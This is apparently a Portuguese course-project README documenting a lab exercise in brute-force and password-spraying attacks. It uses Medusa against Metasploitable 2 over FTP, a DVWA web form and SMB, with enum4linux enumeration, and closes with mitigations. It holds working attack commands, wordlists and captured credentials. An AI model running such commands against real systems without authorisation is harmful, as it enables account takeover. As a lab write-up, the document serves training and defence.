# 🔐 Ataques de Força Bruta com Medusa e Kali Linux

> Projeto prático de segurança ofensiva: simulação de ataques de **força bruta** e **password spraying** em ambiente controlado (laboratório), usando **Kali Linux** e a ferramenta **Medusa** contra o **Metasploitable 2** (FTP, DVWA e SMB).
>
> Desafio da trilha de **Cibersegurança** da [Digital Innovation One (DIO)](https://www.dio.me/).

---

## ⚠️ Aviso legal

Todos os testes deste repositório foram realizados em um **ambiente de laboratório isolado**, em máquinas virtuais de minha propriedade, numa **rede interna (host-only)** sem acesso à internet.

Ataques de força bruta contra sistemas de terceiros **sem autorização expressa são crime** (no Brasil, Lei nº 12.737/2012). O objetivo aqui é **exclusivamente educacional**: entender como o ataque funciona para saber **como se defender**.

---

## 📑 Índice

1. [Introdução](#1-introdução)
2. [Ambiente do laboratório](#2-ambiente-do-laboratório)
3. [A ferramenta Medusa](#3-a-ferramenta-medusa)
4. [Wordlists](#4-wordlists)
5. [Cenário 1 — Força bruta em FTP](#5-cenário-1--força-bruta-em-ftp)
6. [Cenário 2 — Formulário web (DVWA)](#6-cenário-2--formulário-web-dvwa)
7. [Cenário 3 — Enumeração e password spraying em SMB](#7-cenário-3--enumeração-e-password-spraying-em-smb)
8. [Medidas de mitigação](#8-medidas-de-mitigação)
9. [Conclusão e aprendizados](#9-conclusão-e-aprendizados)
10. [Referências](#10-referências)

---

## 1. Introdução

Um **ataque de força bruta** (*brute force*) tenta adivinhar credenciais **testando automaticamente** muitas combinações de usuário/senha até acertar.

| Variação | Descrição |
|---|---|
| **Força bruta pura** | Testa todas as combinações possíveis de caracteres. |
| **Ataque de dicionário** | Testa senhas a partir de uma lista (*wordlist*). |
| **Password spraying** | Testa **uma** senha comum contra **vários** usuários (evita bloqueio de conta). |
| **Credential stuffing** | Reutiliza credenciais vazadas em outros serviços. |

Neste projeto exercitei **ataque de dicionário** (FTP e Web) e **password spraying** (SMB).

---

## 2. Ambiente do laboratório

Duas máquinas virtuais no **VirtualBox**, conectadas por **rede somente-anfitrião (host-only)** para total isolamento.

| Máquina | Função | Sistema | IP |
|---|---|---|---|
| **Atacante** | Executa o Medusa | Kali Linux (6.18) | `192.168.56.101` |
| **Alvo** | Serviços vulneráveis | **Metasploitable 2** | `192.168.56.102` |

O alvo expõe, entre outros, estes serviços (confirmados pelos banners durante os testes):

| Porta | Serviço | Versão |
|---|---|---|
| 21 | FTP | vsFTPd 2.3.4 |
| 80 | HTTP | Apache + **DVWA** |
| 139/445 | SMB | Samba 3.0.20-Debian |

> 💡 A rede `192.168.56.0/24` é a faixa padrão da rede host-only do VirtualBox. Confirmei o IP do alvo com `ip a` dentro da VM.

![Topologia do laboratório](images/01-topologia.png)

---

## 3. A ferramenta Medusa

O **Medusa** é um *brute-forcer* de login **paralelo e modular**, já incluído no Kali. Suporta vários protocolos via módulos (`-M`): `ftp`, `http`, `web-form`, `smbnt`, `ssh`, `mysql`, etc.

**Principais parâmetros:**

| Parâmetro | Função |
|---|---|
| `-h` | Host (IP) alvo |
| `-U` / `-u` | Arquivo de usuários / usuário único |
| `-P` / `-p` | Arquivo de senhas / senha única |
| `-M` | Módulo do serviço |
| `-m` | Opção específica do módulo |
| `-t` | Logins em paralelo |
| `-T` | Hosts em paralelo |

> Para ver as opções de um módulo: `medusa -M <modulo> -q`

---

## 4. Wordlists

Criei wordlists simples (na pasta [`wordlists/`](wordlists/)):

**`users.txt`** — `user`, `msfadmin`, `admin`, `root`
**`pass.txt`** — `123456`, `password`, `qwerty`, `msfadmin`
**`smb_users.txt`** — `user`, `msfadmin`, `service`
**`senhas_spray.txt`** — `password`, `123456`, `Welcome123`, `msfadmin`

Geradas com:

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

> ⚠️ **Lição de sintaxe:** no começo tentei `"echo -e '...' > users.txt"` **entre aspas** e recebi `comando não encontrado`. Colocar o comando inteiro entre aspas faz o shell procurar um programa com aquele nome. O certo é sem as aspas externas.

---

## 5. Cenário 1 — Força bruta em FTP

**Comando:**

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
```

**Resultado (sucesso real):**

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

**Validação do acesso** — loguei manualmente via FTP com a credencial encontrada:

```bash
ftp 192.168.56.102
# Name: msfadmin / Password: msfadmin
230 Login successful.
ftp> ls
drwxr-xr-x  6 1000  1000  4096 Apr 28  2010 vulnerable
```

✅ Acesso confirmado. O servidor vsFTPd 2.3.4 aceitou o login e listou o diretório.

> 🐞 **Erro no caminho:** tentei `ftp 192.168.56.` (IP incompleto) e recebi *"Falha temporária na resolução de nome"* — bom lembrete de conferir o IP antes.

![Força bruta FTP](images/02-ftp-sucesso.png)

---

## 6. Cenário 2 — Formulário web (DVWA)

Este foi o cenário mais rico em aprendizado, porque **não funcionou de primeira**. Documentei toda a depuração.

### Tentativa 1 — Módulo errado (`-M http`)

```bash
medusa -h 192.168.106.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

➡️ `WARNING: Invalid method: PAGE / FORM / FAIL`. O módulo `http` é para **HTTP Basic Auth**, não para formulários HTML (confirmei com `medusa -M http -q`). Para formulário, o módulo é o **`web-form`**:

| `http` (errado) | `web-form` (certo) |
|---|---|
| `-M http` | `-M web-form` |
| `PAGE:` | `FORM:` |
| `FORM:` | `FORM-DATA:` |
| `FAIL=` | `DENY-SIGNAL:` |

### Tentativa 2 — IP incorreto

```
NOTICE: web-form.mod: failed to connect, port 80 was not open on 192.168.106.102
```

➡️ Eu estava usando `192.168.106.102`, mas o IP real do alvo era **`192.168.56.102`** (descoberto abrindo o DVWA no navegador).

### Tentativa 3 — Token CSRF (erro 302)

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M web-form \
-m FORM:'/dvwa/login.php' \
-m FORM-DATA:'post?username=^USER^&password=^PASS^&Login=Login' \
-m DENY-SIGNAL:'Login failed'
```

```
ERROR: ... error code 302
```

➡️ O **302** é um redirecionamento. A página `login.php` usa um campo anti-CSRF (`user_token`) que muda a cada carregamento. Como o Medusa não lê o token novo a cada tentativa, o DVWA rejeita tudo. **O `web-form` não vence a proteção CSRF do `login.php`.**

### Solução — Página de prática `/vulnerabilities/brute/`

O DVWA tem uma página feita para treinar brute force, **sem token** e via GET. Ela exige sessão autenticada, então enviei o **cookie** via `CUSTOM-HEADER`:

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M web-form \
-m FORM:'/dvwa/vulnerabilities/brute/' \
-m FORM-DATA:'get?username=^USER^&password=^PASS^&Login=Login' \
-m DENY-SIGNAL:'incorrect' \
-m CUSTOM-HEADER:'Cookie: PHPSESSID=SEU_PHPSESSID_REAL; security=low'
```

> **Como obter o `PHPSESSID`:** logar no DVWA (`admin`/`password`), mudar **DVWA Security → Low** e copiar o cookie em `F12 → Storage → Cookies`.

### ⚠️ Lição importante — validar resultados (falso-positivo)

Na minha primeira execução, deixei o placeholder `PHPSESSID=COLE_SEU_PHPSESSID_AQUI` no comando. O resultado foi **suspeito**: *todos* os usuários (`user`, `msfadmin`, `admin`, `root`) apareceram como `SUCCESS` com a **mesma** senha `123456`.

Isso é um **falso-positivo clássico**: com o cookie inválido, o DVWA redireciona para o login, a palavra `incorrect` nunca aparece na resposta, e o Medusa interpreta **toda** tentativa como sucesso. A prova de que é falso: esses usuários **não existem** no DVWA (o login válido é `admin`/`password`).

> 🎯 **Aprendizado:** nunca confie cegamente na saída da ferramenta. **Sempre valide** a credencial encontrada fazendo login de verdade. Um cookie/sessão inválido gera sucesso falso. Para um resultado legítimo, é preciso usar um `PHPSESSID` real e ativo.

![Ataque DVWA / falso-positivo](images/03-dvwa.png)

---

## 7. Cenário 3 — Enumeração e password spraying em SMB

### Passo 1 — Enumeração com `enum4linux`

Antes do spraying, enumerei usuários e compartilhamentos do SMB:

```bash
enum4linux -a 192.168.56.102 | tee enum4_output.txt
```

**Achados principais:**
- **Sessão nula permitida:** `Server allows sessions using username '', password ''` (grave!).
- **Usuários reais** extraídos: `msfadmin`, `user`, `service`, `root`, `www-data`, `postgres`, etc.
- **Compartilhamentos:** `tmp` (listável), `print$`, `opt`, `IPC$`, `ADMIN$`.
- **Versão:** Samba 3.0.20-Debian / hostname `METASPLOITABLE`.

> 🐞 Ao abrir o `enum4_output.txt` com `less`, veio *"may be a binary file"* por causa dos caracteres de cor. Para ler limpo, usar `less -R` ou salvar sem cores.

### Passo 2 — Password spraying com `smbnt`

Usei os usuários enumerados e uma senha comum por vez (spraying):

```bash
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

**Resultado (sucesso real):**

```
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
```

✅ Credencial válida com acesso ao compartilhamento administrativo `ADMIN$`.

> 🐞 **Erro de digitação:** primeiro escrevi `senhas_spay.txt` (faltou o "r") e o Medusa retornou `FATAL: Failed to open file`. Corrigido para `senhas_spray.txt`.

![Enumeração e spraying SMB](images/04-smb.png)

---

## 8. Medidas de mitigação

| Medida | Como ajuda |
|---|---|
| **Senhas fortes e únicas** | Inviabilizam ataques de dicionário (o `msfadmin:msfadmin` caiu em segundos). |
| **Bloqueio de conta / rate limiting** | Travar após N tentativas quebra a automação. |
| **MFA** | Mesmo com a senha, falta o 2º fator. |
| **CAPTCHA** | Impede automação em formulários web. |
| **Token anti-CSRF** | Foi exatamente o que **barrou** o ataque ao `login.php` do DVWA. |
| **Desabilitar sessão nula no SMB** | A sessão anônima permitiu enumerar todos os usuários. |
| **Atualizar serviços** | vsFTPd 2.3.4 e Samba 3.0.20 são versões antigas e vulneráveis. |
| **fail2ban / monitoramento** | Detecta e bloqueia IPs com muitas falhas de login. |

---

## 9. Conclusão e aprendizados

Exercitei força bruta em **três superfícies diferentes** (FTP, Web e SMB) e, mais importante que os "SUCCESS", foram as lições do caminho:

- **Escolher o módulo certo** (`web-form` ≠ `http`);
- **Validar alvo e conectividade** antes de atacar (IP e porta corretos);
- Entender como uma defesa real — o **token CSRF** — bloqueia o ataque automatizado;
- **Enumerar antes de atacar** (o `enum4linux` entregou os usuários do spraying);
- **Desconfiar da ferramenta:** identifiquei e expliquei um **falso-positivo** no DVWA e a importância de validar credenciais;
- Atenção a detalhes triviais que quebram tudo: aspas erradas, IP incompleto, nome de arquivo com typo.

Cada erro virou aprendizado sobre **como os sistemas atacam e como se defendem**.

---

## 10. Referências

- [Kali Linux – Site Oficial](https://www.kali.org/)
- [Metasploitable 2 – Documentação (Rapid7)](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [DVWA – Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Medusa – Documentação (Foofus)](http://www.foofus.net/jmk/medusa/medusa.html)
- [Nmap – Manual Oficial](https://nmap.org/book/)
- [Digital Innovation One (DIO)](https://www.dio.me/)

---

*Projeto desenvolvido como parte do desafio prático da DIO. 🚀*
